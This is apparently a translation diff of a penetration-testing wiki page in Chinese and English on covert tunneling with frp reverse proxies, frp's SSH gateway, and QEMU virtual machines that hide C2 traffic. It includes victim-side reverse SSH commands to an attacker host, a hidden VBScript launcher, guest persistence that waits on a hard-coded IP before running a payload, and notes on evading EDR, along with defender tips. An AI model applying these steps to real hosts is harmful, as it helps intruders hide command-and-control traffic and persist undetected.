+[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go reverse-proxy，支持 **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**。自 **v0.53.0 (May 2024)** 起，它可以作为 **SSH Tunnel Gateway**，因此目标主机只需使用系统自带的 OpenSSH client 即可建立 reverse tunnel —— 无需额外的 binary。
 
-### 经典反向 TCP 隧道
+### Classic reverse TCP tunnel
 ```bash
 # Attacker / server
 ./frps -c frps.toml            # listens on 0.0.0.0:7000
@@ -633,7 +633,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### 使用新的 SSH 网关（无 frpc 二进制文件）
+### 使用新的 SSH gateway (无需 frpc binary)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -642,11 +642,11 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具 – 非常适合利用现有资源进行转发。
+上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具——非常适合 living-off-the-land pivoting。
 
-## 使用 QEMU 的隐蔽 VM 基于隧道
+## Covert VM-based Tunnels with QEMU
 
-QEMU 的用户模式网络 (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项 **将 *主机* 上的 TCP/UDP 端口绑定并转发到 *客户机* 中**。 当客户机运行完整的 SSH 守护进程时，hostfwd 规则为您提供一个一次性 SSH 跳转盒，完全存在于一个临时 VM 中 – 非常适合隐藏 C2 流量，因为所有恶意活动和文件都保留在虚拟磁盘中。
+QEMU 的 user-mode networking (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项**在 *host* 上绑定一个 TCP/UDP 端口并将其转发到 *guest* 内***。当 guest 运行完整的 SSH daemon 时，hostfwd 规则会为你提供一个一次性 SSH jump box，完全位于临时 VM 内——非常适合将 C2 流量隐藏于 EDR，因为所有恶意活动和文件都保留在虚拟磁盘中。
 
 ### 快速一行命令
 ```powershell
@@ -658,23 +658,23 @@ qemu-system-x86_64.exe ^
 -device e1000,netdev=n0 ^
 -nographic
 ```
-• 上面的命令在 RAM 中启动一个 **Tiny Core Linux** 镜像 (`tc.qcow2`)。  
-• Windows 主机上的端口 **2222/tcp** 透明地转发到来宾内部的 **22/tcp**。  
-• 从攻击者的角度来看，目标仅仅暴露了端口 2222；任何到达该端口的数据包都由在虚拟机中运行的 SSH 服务器处理。  
+• 上面的命令在内存中启动了一个 **Tiny Core Linux** 镜像（`tc.qcow2`）。
+• Windows 主机上的端口 **2222/tcp** 被透明地转发到 guest 内部的 **22/tcp**。
+• 从攻击者的角度来看，目标只是暴露端口 2222；任何到达它的数据包都会由在 VM 中运行的 SSH 服务器处理。
 
-### 通过 VBScript 隐秘启动
+### 通过 VBScript 隐蔽启动
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
 o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
 ```
-运行脚本 `cscript.exe //B update.vbs` 可以保持窗口隐藏。
+用 `cscript.exe //B update.vbs` 运行脚本可以隐藏窗口。
 
-### 客户端持久性
+### In-guest persistence
 
-由于 Tiny Core 是无状态的，攻击者通常会：
+Because Tiny Core is stateless, attackers usually:
 
-1. 将有效载荷放置到 `/opt/123.out`
+1. 将 payload 放到 `/opt/123.out`
 2. 追加到 `/opt/bootlocal.sh`：
 
 ```sh
@@ -682,28 +682,28 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 /opt/123.out
 ```
 
-3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，以便在关机时将有效载荷打包到 `mydata.tgz` 中。
+3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，以便在关机时 payload 被打包到 `mydata.tgz` 中。
 
-### 为什么这能逃避检测
+### Why this evades detection
 
-• 只有两个未签名的可执行文件 (`qemu-system-*.exe`) 访问磁盘；没有安装驱动程序或服务。
-• 主机上的安全产品看到的是 **良性的回环流量**（实际的 C2 在虚拟机内部终止）。
-• 内存扫描器从未分析恶意进程空间，因为它存在于不同的操作系统中。
+• 只有两个未签名的可执行文件（`qemu-system-*.exe`）接触磁盘；没有安装驱动或服务。  
+• 主机上的安全产品只看到 **良性环回流量**（实际的 C2 在 VM 内终止）。  
+• 内存扫描器不会分析恶意进程空间，因为它运行在不同的操作系统中。
 
-### Defender 提示
+### Defender tips
 
-• 对用户可写路径中的 **意外 QEMU/VirtualBox/KVM 二进制文件** 发出警报。
-• 阻止来自 `qemu-system*.exe` 的出站连接。
-• 寻找在 QEMU 启动后立即绑定的稀有监听端口（2222, 10022, …）。
+• 对出现在用户可写路径中的 **意外的 QEMU/VirtualBox/KVM 二进制文件** 触发告警。  
+• 阻止来源于 `qemu-system*.exe` 的出站连接。  
+• 搜索在 QEMU 启动后立即绑定的罕见监听端口（2222、10022、…）。
 
 ---
 
-## 其他检查工具
+## Other tools to check
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
-## 参考文献
+## References
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 - [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
